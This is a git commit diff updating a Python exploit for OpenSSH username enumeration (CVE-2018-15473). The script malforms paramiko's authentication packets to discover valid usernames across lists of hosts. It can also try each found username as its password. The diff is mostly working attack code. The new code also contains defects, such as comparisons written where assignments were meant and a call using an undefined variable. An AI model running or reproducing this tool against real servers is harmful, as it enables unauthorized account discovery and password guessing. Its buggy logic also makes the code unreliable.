d32bb13c2017c0c0d3d3ceeb4d5ab6e9175b0025
JoeBlackSecurity <44617164+JoeBlackSecurity@users.noreply.github.com>
2018-10-31 18:21:28 +0900

    Update SSHUsernameBrute.py

--- SSHUsernameBrute.py
+++ SSHUsernameBrute.py
@@ -1,11 +1,11 @@
 # Exploit: OpenSSH 7.7 - Username Enumeration
-# Original Author: Justin Gardner (https://www.exploit-db.com/exploits/45210/)
+# Original Author: Justin Gardner (https://www.exploit-db.com/exploits/45233/)
 # Updated Version Author: Joe Black
 # Date: 2018-10-31
 # Software: https://ftp4.usa.openbsd.org/pub/OpenBSD/OpenSSH/openssh-7.7.tar.gz
 # Affected Versions: OpenSSH version < 7.7
 # CVE: CVE-2018-15473
-# Version 1.3
+# Version 1.4
  
 ###########################################################################
 #                ____                    _____ _____ _    _               #
@@ -30,16 +30,16 @@ import socket
 import sys
 import json
 import os
+import time
 from datetime import datetime
 startTime = datetime.now()
+authcheck = False
 
 dirName = 'SSHLoginData'
  
 if not os.path.exists(dirName):
     os.mkdir(dirName)
     print "Directory " , dirName ,  " Created "
-# else:    
-    # print "Directory " , dirName ,  " already exists"
 
 # store function we will overwrite to malform the packet
 old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
@@ -84,17 +84,21 @@ def checkUsername(runArray, tried=0):
         transport.close()
         if tried < 4:
             tried += 1
+            time.sleep(3)
             return checkUsername(runArray, tried)
         else:
             print '[-] Failed to negotiate SSH transport'
+            return False
     try:
         transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
     except BadUsername:
         return (False)
+    # except paramiko.ssh_exception.SSHException:
+        # return checkUsername(runArray)
     except paramiko.ssh_exception.AuthenticationException:
         out = False
-        
-        if args.testcreds:
+        global authcheck
+        if authcheck == True:
             out = sshAuth(host,port,username)
             paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
             paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error
@@ -110,11 +114,30 @@ def checkUsername(runArray, tried=0):
         return (True)
     #Successful auth(?)
     raise Exception("There was an error. Is this the correct version of OpenSSH?")
-    
+
+def checkauthtype(host, port):
+
+    paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = old_parse_service_accept
+    paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = old_parse_userauth_failure
+    s = socket.socket()
+    s.connect((host, port))
+    checkauth = paramiko.Transport(s)
+    checkauth.connect()
+    try:
+        checkauth.auth_none('')
+        paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
+        paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error
+    except paramiko.BadAuthenticationType, err:
+        global authcheck
+        if "password" not in err.allowed_types:
+            authcheck == False
+            return host, port, False
+        else:
+            authcheck == True
+            return host, port, True
+            
 def sshAuth(host,port,username, tried=0):
     try:
-        paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = old_parse_service_accept
-        paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = old_parse_userauth_failure
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         ssh.connect(host, port=port, username=username, password=username, allow_agent=False)
@@ -127,6 +150,7 @@ def sshAuth(host,port,username, tried=0):
             # server was likely flooded, retry up to 3 times
             if tried < 4:
                 tried += 1
+                time.sleep(3)
                 return sshAuth(host,port,username, tried)
             else:
                 print '[-] Failed to negotiate SSH transport. Trying next user.' 
@@ -140,17 +164,29 @@ def saveFile(username, host, port, out):
         outputFile.writelines(datetime.now().strftime('%D %H:%M') + " - " +str(host) + ':' + str(port) + ' - ' + username + '\n')
     outputFile.close()
 
-def trySocket(host, port):
+def trySocket(host, port, tried=0):
+    print "Testing host: " + host + ":" + str(port)
     sock = socket.socket()
     try:
         sock.connect((host, port))
         sock.close()
     except socket.error:
-        print '[-] Connecting to host: ' + host + 'failed. Please check the specified host and port.'
+        print '[-] Connecting to host: ' + host + ' failed. Please check the specified host and port.'
         # sys.exit(1)
         return False, False
     except paramiko.ssh_exception.SSHException:
-        print "asd"
+        # server was likely flooded, retry up to 3 times
+        if tried < 4:
+            tried += 1
+            print '[-] SSH service might be flooded and is not responding. Waiting 10 seconds.' 
+            time.sleep(3)
+            return sshAuth(host,port,username, tried)
+        else:
+            print '[-] Failed to negotiate SSH transport. Trying next user.' 
+            return False
+    global authcheck
+    if args.testcreds:
+        host, port, authcheck = checkauthtype(host, port)
     return host, port
   
 # assign functions to respective handlers
@@ -168,6 +204,8 @@ arg_parser = argparse.ArgumentParser(
              I had some fun working on this script. The original author did an awesome job writing it but I wanted more functionality.
              Added the ability to use large lists of IPs along with pre-defined username lists. Also You can use the --testcreds flag to try valid usernames as username:password combos.
              Its a lot of crappy code. But It works fairly well and I feel good about this tool.\n
+             New Additions:
+                Added a check that verifies the SSH server accepts 'password' authentication and disables testcred if the server doesn't and is selected by user.
              
          '''))
 
@@ -206,7 +244,6 @@ def run_line():
                 pool = multiprocessing.Pool(args.threads)
                 results = pool.map(checkUsername, runArray)
 
-                
                 if results[0] == False:
                     print "[-] Username " + args.username + " does not exist on " + str(args.hostname)
                 print "Running time - Host: " + host + " done in " + str(datetime.now() - startTime) + "\n"
@@ -283,15 +320,12 @@ def run_line():
                 except IOError:
                     print "[-] File doesn't exist or is unreadable."
                     sys.exit(3)
-                    
                 runArray = []
                 host, port = trySocket(args.hostname,args.port)
                 if host == False:
                     sys.exit(1)
-
                 for temp in f.readlines():
                     runArray.append([args.hostname,args.port,temp.strip()])
-                    
                 f.close()
                 pool = multiprocessing.Pool(args.threads)
                 results = pool.map(checkUsername, runArray)
@@ -341,3 +375,7 @@ def run_line():
 if __name__ == "__main__":
     run_line()
         
+        
+        
+                    # except paramiko.ssh_exception.SSHException:
+                # print "Error with host: " + host + ". Moving on..."
